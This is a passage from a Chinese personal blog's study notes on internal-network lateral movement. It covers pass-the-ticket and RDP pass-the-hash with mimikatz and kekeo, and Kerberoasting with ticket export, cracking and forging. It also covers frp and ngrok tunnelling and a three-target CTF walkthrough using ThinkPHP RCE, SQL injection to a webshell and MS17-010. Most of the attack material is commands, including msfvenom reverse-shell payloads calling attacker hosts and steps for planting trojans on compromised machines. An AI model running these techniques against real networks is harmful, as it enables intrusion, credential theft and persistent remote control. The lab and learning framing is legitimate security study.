class="number">3.21</span>（这里好像只可以计算机名）\c$</span><br></pre></td></tr></table></figure>
<p><code>2、利用工具kekeo</code></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">生成票据</span><br><span class="line">    .\kekeo <span class="string">&quot;tgt::ask /user:[域成员名] /domain:[域名] /ntlm:[ntlm值]&quot;</span></span><br><span class="line">    .\kekeo <span class="string">&quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695d……&quot;</span></span><br><span class="line">导入票据</span><br><span class="line">    kerberos::ptt [票据文件]</span><br><span class="line">    kerberos::ptt <span class="title class_">TGT_mary</span><span class="variable">@GOD</span>.<span class="title class_">ORG_krbtgt</span>~god.org<span class="variable">@GOD</span>.<span class="title class_">ORG</span>.kirbi</span><br><span class="line">查看凭证</span><br><span class="line">    klist</span><br><span class="line">利用net <span class="keyword">use</span>载入</span><br><span class="line">    dir \\<span class="number">192.168</span>.<span class="number">3.21</span>\c$</span><br></pre></td></tr></table></figure>
<p><code>3、利用本地票据（需管理权限-应该是类似于cookie窃取）</code><br>若在票据存活时间内有人连接过，就是收集本机之前连接过的票据收集起来，看还有没有效果。<br>利用mimikatz收集本地票据，再将票据导入到内存中进行连接。有存活时间限制</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    privilege::debug</span><br><span class="line">    sekurlsa::tickets /<span class="keyword">export</span></span><br><span class="line">    kerberos::ptt [票据文件]</span><br></pre></td></tr></table></figure>
<h4 id="传递-RDP"><a href="#传递-RDP" class="headerlink" title="传递|RDP"></a>传递|RDP</h4><h5 id="RDP协议"><a href="#RDP协议" class="headerlink" title="RDP协议"></a>RDP协议</h5><p>是一种远程的连接的协议，linux的ssh，windows的RDP（需要3389端口）。<br>域横向移动RDP传递-Mimikatz<br>除了上述讲到的IPC，WMI，SMB等协议的链接外，获取到的明文密码或HASH密文也可以通过RDP协议（远程桌面）进行链接操作。<br>1、判断对方远程桌面服务是否开启（默认：3389），端口扫描判断<br>2、RDP明文密码链接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows：mstsc（远程桌面连接）-输入账号密码</span><br><span class="line">Windows命令行：mstsc.exe /console /v:[IP] /admin</span><br><span class="line">Linux：（需要安装rdesktop）rdesktop [IP]</span><br></pre></td></tr></table></figure>
<p>3、RDP密文HASH链接<br>windows Server需要开启Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启<br>同时如果Win 7和Windows Server 2008 R2安装了2871997、2973351补丁也支持，不过要开启cmd命令修改注册表：</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    REG <span class="keyword">ADD</span><span class="language-bash"> <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span></span><br></pre></td></tr></table></figure>
<p>4、通过mimikatz链接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mstsc.exe /restrictedadmin</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 <span class="string">&quot;/run:mstsc.exe /restrictedadmin&quot;</span> </span><br></pre></td></tr></table></figure>
<h3 id="域环境-SPN"><a href="#域环境-SPN" class="headerlink" title="域环境|SPN"></a>域环境|SPN</h3><p><img src="https://pic.imgdb.cn/item/65766d72c458853aefea528a.webp"></p>
<h4 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h4><p>1、当计算机加入域时，主SPN会自动添加到域的计算机账号的ServicePrincipalName属性中。在安装新的服务后，SPN也会被记录在计算机账号的相应属性中。<br>2、SPN扫描也称为“扫描Kerberos服务实例名称”。在活动目录中发现服务的最佳方法就是SPN扫描。SPN扫描通过请求特定SPN类型的服务主体名称来查找服务。与网络端口扫描相比，SPN扫描的主要特点是不需要通过连接网络中的每个IP地址来检查服务端口（不会因为触发内网中的IPS、IDS等设备的规则而产生大量的警告日志）。因为SPN查询是Kerberos票据行为的一部分，所以检测难度很大，因此，被防护软件拦截的可能性比nmap扫描低。<br>3、由于SPN扫描是基于LDAP协议向域控制器进行查询的，所以，攻击者只需要获得一个普通的域用户权限，就可以进行SPN扫描。<br><code>简而言之：在域环境中发现服务的最好办法就是通过“SPN扫描”通过请求特定SPN类型服务主体名称来查找服务。</code></p>
<h4 id="基于SPN扫描的攻击"><a href="#基于SPN扫描的攻击" class="headerlink" title="基于SPN扫描的攻击"></a>基于SPN扫描的攻击</h4><p>域横向移动SPN服务-探针，请求，导出，破解，重写<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/8082623.html">https://www.cnblogs.com/backlion/p/8082623.html</a><br><code>过程：</code>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。<br><code>具体操作</code><br>以下操作都在PowerShell进行<br><code>1、探针（探针域内全部主机存在什么SPN服务）</code><br>什么权限都可以完成探针</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#探测域内服务</span></span><br><span class="line">    setspn -q */*</span><br><span class="line"><span class="meta">#寻找特定服务</span></span><br><span class="line">    setspn -q */* <span class="string">| findstr &quot;</span>[服务名]<span class="string">&quot;</span></span><br><span class="line"><span class="meta">#找到合适的服务作为攻击目标,回显要保存下来。</span></span><br></pre></td></tr></table></figure>
<p><code>2、请求（请求我们需要的服务）</code><br>清空当前机器中的凭证，防止影响下面的操作（可以不删除）</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#查看已有票据</span><br><span class="line">    klist</span><br><span class="line">#删除已有票据</span><br><span class="line">    klist purge</span><br><span class="line">#请求对应服务</span><br><span class="line">    <span class="keyword">Add</span>-<span class="keyword">Type</span> -AssemblyName <span class="keyword">System</span>.IdentityModel</span><br><span class="line">    <span class="built_in">New</span>-<span class="keyword">Object</span> <span class="keyword">System</span>.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;[服务名(之前探针到的)]&quot;</span><br></pre></td></tr></table></figure>
<p>或使用mimikatz请求</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    mimikatz<span class="selector-class">.exe</span> <span class="string">&quot;kerberos::ask /target:[服务名]&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>3、导出</code></p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#导出凭据</span></span><br><span class="line">    mimikatz.exe <span class="string">&quot;kerberos::list /export&quot;</span></span><br><span class="line"><span class="meta">#利用mimikatz导出，会导出到mimikatz所在的目录</span></span><br></pre></td></tr></table></figure>
<p><code>4、破解</code><br>破解凭据<br>可以将凭证复制到本地破解，避免提交破解的脚本<br>使用tgsrepcrack.py脚本加爆破字典来破解</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将凭据放在脚本文件目录中后</span></span><br><span class="line">    python3 .<span class="string">\tgsrepcrack.py</span> .<span class="string">\[密码文件.txt]</span> .<span class="string">\[凭据.kirbi]</span></span><br><span class="line">    python3 .<span class="string">\tgsrepcrack.py</span> .<span class="string">\password.txt</span> .<span class="string">\1-40a00000-jerry@MSSQLSvcSrv-DB-0day.0day.org1433-0DAY.ORG.kirbi</span></span><br><span class="line"><span class="comment">#破解成功会把被攻击的服务账户的明文密码显示出来，再想办法利用密码</span></span><br></pre></td></tr></table></figure>
<p><code>破解后，我多了一个用户|登录服务的密码，我可以那这个密码连接对应服务，或作为字典继续爆破；也可以进行重写</code><br><code>5、重写--进行提权？</code><br>类似于之前的PTT。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#使用kerberoast.py和密码重写凭据(重新生成TGT)</span><br><span class="line">    python kerberoast<span class="selector-class">.py</span> -<span class="selector-tag">p</span> <span class="selector-attr">[得到的密码]</span> -r <span class="selector-attr">[已有的凭据.kirbi]</span> -w <span class="selector-attr">[新凭据的名字.kirbi]</span> -u <span class="number">500</span></span><br><span class="line">    python kerberoast<span class="selector-class">.py</span> -<span class="selector-tag">p</span> Password123 -r xxxx<span class="selector-class">.kirbi</span> -w PENTESTLAB<span class="selector-class">.kirbi</span> -u <span class="number">500</span></span><br><span class="line">    python kerberoast<span class="selector-class">.py</span> -<span class="selector-tag">p</span> <span class="selector-attr">[得到的密码]</span> -r <span class="selector-attr">[已有的凭据.kirbi]</span> -w <span class="selector-attr">[新凭据的名字.kirbi]</span> -g <span class="number">512</span></span><br><span class="line">    python kerberoast<span class="selector-class">.py</span> -<span class="selector-tag">p</span> Password123 -r xxxx<span class="selector-class">.kirbi</span> -w PENTESTLAB<span class="selector-class">.kirbi</span> -g <span class="number">512</span></span><br><span class="line">#“-u <span class="number">500</span>”指管理员，“-g <span class="number">512</span>”指管理员组</span><br></pre></td></tr></table></figure>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#将生成的票据注入内存</span></span><br><span class="line">    mimikatz.exe kerberos::ptt [票据文件.kirbi]</span><br><span class="line">    mimikatz.exe kerberos::ptt xxxx.kirbi</span><br></pre></td></tr></table></figure>
<p>用重写的凭据来链接，<code>不一定成功连接管理员账户</code>，且一般只能得到普通用户权限<br><code>结语</code><br>在使用cs工具时，内网的每台主机必须存在一张连接外网的网卡，cs才可成功控制。<br>如何克服：隧道代理。即，不是有一台是连接外网的吗，我就把这台连接外网的主机当作一个跳板，随后，其他主机通过这个隧道转发出去。<br>正向连接：自己连接靶机；反向连接：靶机反弹给自己的主机。<br>这就是下次要学习的内容。</p>
<h2 id="横向渗透-穿透"><a href="#横向渗透-穿透" class="headerlink" title="横向渗透|穿透"></a>横向渗透|穿透</h2><p><img src="https://pic.imgdb.cn/item/657eb779c458853aefe0dc09.webp"></p>
<h3 id="穿透-代理"><a href="#穿透-代理" class="headerlink" title="穿透|代理"></a>穿透|代理</h3><p>作用：两个内网的通信、也可以稍微解决一些防火墙的拦截</p>
<h4 id="代理-基础知识"><a href="#代理-基础知识" class="headerlink" title="代理|基础知识"></a>代理|基础知识</h4><p><code>1.区分内外网</code><br>IPv4地址设计时保留了一部分作为私有地址，它们不会被当作共有地址分配出去，而是只在局域网内使用<br>地址段                            掩码<br>10.x.x.x                       255.0.0.0<br>172.16.x.x-172.31.x.x          255.240.0.0<br>192.168.x.x                    255.255.0.0<br><code>2.内网间的通信问题</code><br>使用代理技术，不然无法通信<br><code>3.正向反向协议通信连接问题</code><br>正向：控制端到被控端<br>反向：被控端到控制端<br>一般都是反向连接？因为正向连接，内网ip不唯一，找不到；就算内网主机拥有一个外网的网卡（应该说是通过路由器可以访问到外网），可能因为路由配置（即：这个公网ip是路由器的）或者防火墙的限制也可能连接不上。</p>
<h4 id="代理-具体分析"><a href="#代理-具体分析" class="headerlink" title="代理|具体分析"></a>代理|具体分析</h4><p><img src="https://pic.imgdb.cn/item/657eb78fc458853aefe129dd.webp"><br>1、一般的木马是走http或tcp协议的，所以设置代理时，要选对协议。<br>2、使用Ngrok时，要注意msf生成木马的指令</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_http <span class="attribute">lhost</span>=xiaodisec.free.idcfengye.com <span class="attribute">lport</span>=80 -f exe -o</span><br><span class="line"><span class="comment">#reverse_http，代表木马传输数据走的是http协议，后面的lport端口也要写80；lhost写的是代理的ip</span></span><br><span class="line"><span class="comment">#然后将木马上传到肉鸡，运行即可。</span></span><br></pre></td></tr></table></figure>
<p>3、建议使用frp，但是需要一台黑黑的服务器，自建跳板。<br><code>具体使用frp</code><br>(1)、服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">服务器修改配置文件frps.ini：</span><br><span class="line">[common]</span><br><span class="line">bind_port = <span class="number">6677</span>            <span class="comment">#frps工作端口，必须和frpc保持一致(msf与服务器连接的端口)</span></span><br><span class="line">启动服务端：</span><br><span class="line">.<span class="regexp">/frps -c ./</span>frps.ini</span><br></pre></td></tr></table></figure>
<p>(2)、控制端-下载-解压-修改-启动</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">控制端修改配置文件frpc.ini：</span><br><span class="line">[common]</span><br><span class="line">server_addr = [你的云主机ip]</span><br><span class="line">server_port = 6677         <span class="comment">#frpc工作端口，必须和frps保持一致</span></span><br><span class="line">[msf]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 5555            <span class="comment">#转发给本机的5555</span></span><br><span class="line">remote_port = 6000        <span class="comment">#服务端用6000端口转发给本机</span></span><br><span class="line">启动客户端：</span><br><span class="line">    ./frpc -c ./frpc.ini</span><br><span class="line">生成后门并上传至肉鸡</span><br><span class="line">    msfvenom -p windows/meterpreter/reverse_tcp lhost=[服务器IP地址] lport=6000 -f exe -o frp.exe</span><br><span class="line">监听后门</span><br><span class="line">    use exploit/multi/handler</span><br><span class="line">    <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">    <span class="built_in">set</span> LHOST 127.0.0.1</span><br><span class="line">    <span class="built_in">set</span> LPORT 5555</span><br><span class="line">    exploit</span><br></pre></td></tr></table></figure>
<p>(3)、靶机运行frp即可</p>
<h4 id="代理-一道ctf夺旗"><a href="#代理-一道ctf夺旗" class="headerlink" title="代理|一道ctf夺旗"></a>代理|一道ctf夺旗</h4><p>三层漫游环境：<br><img src="https://pic.imgdb.cn/item/657eb7a0c458853aefe1663a.webp"><br><code>CFS三层内网漫游安全测试演练-某CTF线下2019</code><br>来源：2019某CTF线下赛真题内网结合WEB攻防题库，涉及WEB攻击，内网代理路由等技术，每台服务器存在一个Flag，获取每一个Flag对应一个积分，获取三个Flag结束。<br><code>Target1：</code><br>流程：探针目标-利用WEB漏洞(TP5_RCE)-获取webshell权限-获取Flag1-进入Target2<br>0、端口扫描，发现目标主机。发现ThinkPHPv5框架，使用对应的exp写入后门<br>1、生成反向后门：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=192.168.76.132 <span class="attribute">LPORT</span>=1111 -f elf &gt;t1.elf</span><br></pre></td></tr></table></figure>
<p>2、接受反弹：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    use exploit/multi/handler</span><br><span class="line">    <span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">    <span class="built_in">set</span> LHOST 192.168.76.132</span><br><span class="line">    <span class="built_in">set</span> LPORT 1111</span><br><span class="line">    exploit</span><br></pre></td></tr></table></figure>
<p>此时，获得了第一台靶机的主机权限（相当于从webshell权限提升至主机权限），然后开始内网渗透，获取第二台靶机的flag。<br><code>在开始Target2之前，得要配置代理（即开启靶机1的内网网卡，作为代理，帮助我们渗透）</code><br>3、配置路由|配置代理|扫描靶机2<br>探索内网并添加路由，从而发现和联系上内网<br><code>（1）、配置路由</code><br>获取网络接口（获取网卡信息，实战中没有拓扑图，不知道网络情况）：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ifconfig是否也可以</span></span><br><span class="line"><span class="built_in">run</span> get_local_subnets</span><br></pre></td></tr></table></figure>
<p>查看路由地址：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">run</span> autoroute -p</span><br></pre></td></tr></table></figure>
<p>添加路由地址：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">run</span> autoroute -s <span class="number">192.168.22.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
<p><code>此时，靶机1和靶机2可以通信了。但是只受限于那个msf的会话，即添加后可以看到路由地址了，添加后可以使用MSFping通22网段了(只基于MSF会话可以通信)</code><br><img src="https://pic.imgdb.cn/item/657eb7b1c458853aefe19dfe.png"><br><code>（2）、配置代理|打通内网</code><br>现在的会话是session1，是建立在Target1的shell上的，建立路由后可以和22网段进行通信。那么我们想要通过session1用工具去攻击22网段，这个时候该怎么办呢？<br>(为了解决这种情况，我们可以在本地(msf上有模块可以开代理)开一个代理，通过这个代理给其他人一个端口去连接，然后我们就可以用自己的本机(自己的电脑，不是攻击机kali)去连接kali的端口，这样就能访问192.168.22.129)<br>可以使用sock4+proxychains4代理打通内网</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">background   保存拿到的shell会话，隐藏到后台</span><br><span class="line">use auxiliary/server/socks4a</span><br><span class="line"><span class="keyword">set</span> srvport <span class="comment">2222</span></span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
<p><code>（3）、利用本地代理接口访问测试</code><br>自己再准备一台攻击机（或者在本机另开一个shell）<br>linux：<br>配置proxychains（kali自带）后调用工具探针Target2</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br><span class="line">socks4 <span class="number">192.168</span><span class="number">.76</span><span class="number">.132</span> <span class="number">2222</span></span><br><span class="line">proxychains4 nmap -<span class="keyword">sT</span> -Pn <span class="number">192.168</span><span class="number">.22</span><span class="number">.0</span>/<span class="number">24</span> -p80</span><br><span class="line">-Pn：不使用<span class="built_in">ping</span>扫描，不执行主机发现，默认目标主机是存活的，可以绕开防火墙。</span><br><span class="line">-<span class="keyword">sT</span>：使用TCP连接，与目标三次握手，来确定端口是否开放</span><br></pre></td></tr></table></figure>
<p>然后具体扫靶机2就可以（一般扫80足矣）。<br>浏览器：<br>为了顺利访问到Target2的网页，需要设置浏览器代理进行访问（比如：浏览器-&gt;设置-&gt;网络-&gt;sock4-&gt;写上刚刚配置的代理）<br>其他工具也需要设置代理<br>windows：<br>利用代理工具Proxifier或SocksCap64,配置好后,将要使用的工具加入里面就可以了<br><code>Target2</code><br>现在我通过攻击机成功访问到了靶机2的网页，接下来就实施攻击。<br><code>过程：探针目标-利用WEB漏洞(SQL注入)-后台获取webshell权限-获取Flag-进入Target3</code><br>0、漏洞利用，注入：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">22.128</span>/index.php?r=vul&amp;keyword=<span class="number">1</span>         <span class="comment">#sql注入</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">22.128</span><span class="regexp">/index.php?r=admini/</span>public/login    <span class="comment">#后台</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">22.128</span>/index.php?r=special                <span class="comment">#后门shell写入</span></span><br></pre></td></tr></table></figure>
<p>通过robots.txt找到后台登陆地址，通过后台功能拿webshell，同时flag2到手。<br><code>此时是webshell权限，还是要提一下权</code><br>此时，要用蚁剑连接，刚好上面有代理设置，设置一下就可以连接；或者使用全局代理工具<code>Proxifier</code>；或者使用代理进程工具<code>SocksCap64</code>（直接将工具拖进去就可以正常在内网工作）。<br><code>接下来是重点：由于靶机2只有22|33网段的网卡，但是攻击机在76网段，所以反向连接不了；而我的kali之前配置过22网段的路由，所以kali可以找到靶机2，因此要正向连接</code><br>1、生成正向后门：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">   msfvenom -p linux<span class="regexp">/x64/m</span>eterpreter/bind_tcp LPORT=<span class="number">3333</span> -f elf &gt; t2.elf</span><br><span class="line"><span class="comment">#绑定本地的3333端口</span></span><br></pre></td></tr></table></figure>
<p>2、访问接受|反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    use exploit/multi/handler</span><br><span class="line">    <span class="built_in">set</span> payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">    <span class="built_in">set</span> rhost 192.168.22.128</span><br><span class="line">    <span class="built_in">set</span> LPORT 3333</span><br><span class="line">    exploit</span><br><span class="line"><span class="comment">#找到靶机2的ip</span></span><br></pre></td></tr></table></figure>
<p>3、信息收集及配置访问<br>还是一样，再开通33网段的路由。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取网络接口：<span class="built_in">run</span> get_local_subnets</span><br><span class="line">查看路由地址：<span class="built_in">run</span> autoroute -p</span><br><span class="line">添加路由地址：<span class="built_in">run</span> autoroute -s 192.168.33.0/24</span><br></pre></td></tr></table></figure>
<p>4、转入target3<br><code>Target3:</code><br>探针目标-端口及漏洞扫描-利用MS17010获取系统权限-获取Flag3-拿下<br>扫描33网段</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychains4</span> nmap -Pn -sT <span class="number">192.168.33.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
<p>主机漏洞扫描</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychains4</span> nmap -script=vuln <span class="number">192.168.33.33</span> -<span class="literal">oN</span> nmapscan/vuln</span><br></pre></td></tr></table></figure>
<p>发现这是开放着445、3389端口的Windows系统 ，尝试使用永恒之蓝试试</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">bind_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">RHOST 192.168.33.33</span></span><br><span class="line">options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>成功反弹</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">net <span class="keyword">user</span></span><br><span class="line"><span class="title">或getuid</span></span><br></pre></td></tr></table></figure>
<p>找|读取flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">dir</span> /S *flag* /B <span class="comment">#找flag</span></span><br><span class="line"><span class="built_in">type</span> C:\Windows\System32\config\flag.txt <span class="comment">#读取flag</span></span><br><span class="line"><span class="comment"># /B 显示文件夹或文件的名字</span></span><br><span class="line"><span class="comment"># /S 显示指定目录和所有子目录中的文件。</span></span><br><span class="line"><span class="comment"># dir /S /B *flag* 这样写也可以</span></span><br></pre></td></tr></table></figure>
<p>取材：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_60329395/article/details/126001763">https://blog.csdn.net/weixin_60329395/article/details/126001763</a><br><code>后面msf和cs配合使用也很重要</code></p>
<h3 id="穿透-隧道"><a href="#穿透-隧道" class="headerlink" title="穿透|隧道"></a>穿透|隧道</h3><p>作用：解决一些安全设备、防火墙的拦截的问题（回传数据）</p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a></div><div class="post_share"><div class="social-share" data-image="/img/reHe.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/12/13/phpWeiXieYi/" title="php伪协议"><img class="cover" src="/img/reHe.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">php伪协议</div></div></a></div><div class="next-post pull-right"><a href="/2023/12/02/ctfshow/" title="ctfshow|Recording"><img class="cover" src="/img/preview.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ctfshow|Recording</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">DralinF</div><div class="author-info__description">A Little Blog Of Dralin</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">28</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/fzsecurity-github"><i class="fab fa-github"></i><span>Come with me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2786245981@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=2786245981&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my little world</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91-%E5%B7%A5%E4%BD%9C%E7%BB%84-%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88"><span class="toc-text">内网安全|域横向|工作组|局域网探针</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 